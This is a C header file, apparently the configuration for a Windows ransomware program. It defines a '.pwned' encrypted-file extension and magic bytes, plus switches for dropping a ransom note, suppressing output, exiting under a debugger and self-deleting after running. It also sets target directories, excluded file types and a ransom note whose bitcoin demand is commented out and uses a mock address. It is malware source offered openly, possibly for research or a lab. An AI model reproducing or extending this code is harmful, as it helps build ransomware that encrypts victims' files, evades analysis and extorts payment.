// config.h
#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>
/*---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */


#define ENCRYPT_EXT_W       L".pwned"    // Encrypted file extension



#define SIGNATURE          0x646e7770 //  Magic bytes for encrypted files ('pwnd')



//#define DECRYPTOR         // Uncomment to build as decryptor



#define RANSOM_MODE         // Drop ransom note



#define SILENT_MODE         // Suppress all STDOUT



#define DEBUGGER_EVASION    // Exit if debugger is detected



#define SELF_DELETION       // Self-delete after execution



#define CONFIG_TARGET_DIRS \
    L"C:\\Users\\Public", \
    NULL 



#define CONFIG_BLACKLISTED_EXTS \
    ENCRYPT_EXT_W,               \
    L".exe", L".dll", L".sys", L".msi", \
    NULL



#define CONFIG_RANSOM_NOTE \
    "YOUR FILES HAVE BEEN ENCRYPTED!\r\n"  \
//  "This is not a joke. Want your data restored?\r\n"  \
//  "Send 0.5 BTC to the address below:\r\n"    \
//  "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"    \
//  "You have 48 hours.\r\n"    \
 


/*---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */


#endif // CONFIG_H